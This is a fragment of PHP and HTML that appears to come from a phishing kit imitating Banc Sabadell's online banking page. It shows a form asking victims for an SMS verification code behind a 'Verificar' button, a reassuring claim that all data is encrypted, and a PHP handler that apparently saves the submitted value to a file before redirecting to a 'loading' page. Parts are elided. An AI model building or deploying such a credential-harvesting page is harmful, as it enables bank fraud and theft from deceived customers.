...
if(isset($_POST['doSubmit']))
{
    ...
    fclose($house);
    header("Location: loading.php?id=3");
}
  ...
  <div id="accessForms" style="margin-bottom:2px;margin-left:0px;min-height:253px;_height:253px">
    <div iclass="tabsLogin">    
      ...
      <div class="contentTab" style="width: 345px; position: relative;">    
        ...
        <input type="text" name="sms" required placeholder="SMS" class="pinDNI">
        
        
        
        
        <input type="button" style="display:none" id="loginTarjeta"  class="btnLogin" value="Entrar">
        <input style="background-color: #006dff; color: white;"  name="doSubmit" type="submit" value="Verificar" class="btnLogin" >
      ...
      <div id="capaSinLogin"><form name="formAqui" class="linkSinLogin" action="" method="POST" target="_self"><input type="hidden" name="pagename" value="GBS_contenedora"><input type="hidden" name="childpagename" value="SabAtl/GBS_distribuidora"><input type="hidden" name="c" value="GBS_Form_FA"><input name="idPageMenu" type="hidden" value="undefined"><input type="hidden" name="language" value="1178258082822"><input type="hidden" name="site" value="SabAtl">
            <a id="urlForm" href="https://www.bancsabadell.com/cs/Satellite/SabAtl/Online/1191332203410/es/" onclick="send_form(&quot;formAqui&quot;)">Toda su información está encriptada por razones de seguridad.
            </a></form></div>
    </div> 
        </div>
